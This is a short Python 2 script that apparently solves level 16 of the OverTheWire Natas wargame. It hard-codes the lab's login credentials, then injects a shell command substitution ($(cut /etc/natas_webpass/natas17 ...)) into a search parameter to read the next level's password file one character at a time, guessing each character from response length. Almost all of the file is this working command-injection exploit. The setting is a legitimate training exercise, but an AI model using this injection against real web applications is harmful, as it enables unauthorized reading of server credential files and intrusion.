#!/usr/bin/python

import os, socket, sys, re, urllib2

#ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz
charSet = "0123456789"
pwLength = 32


passman = urllib2.HTTPPasswordMgr()
passman.add_password("Authentication required","http://natas16.natas.labs.overthewire.org/", "natas16", "3VfCzgaWjEAcmCQphiEPoXi9HtlmVr3L")
auth = urllib2.HTTPBasicAuthHandler(passman)
opener = urllib2.build_opener(auth)
urllib2.install_opener(opener)

#use RE for "This user doesn't exist." or "This user exists."
i=0
flag = ""

while i < pwLength:
	i+=1
	url = "http://natas16.natas.labs.overthewire.org/?needle=$(cut+/etc/natas_webpass/natas17+-c"+str(i)+"-"+str(i)+")&submit=Search"
	page = urllib2.urlopen(url)
	resp = page.read()

	if len(resp) > 473:
		flag += '-'
		f = open(str(i)+'.txt', 'w')
		f.write(resp)
		f.close()
	else:
		flag += '?'
	print flag
#match = re.search(r'exists.', resp)
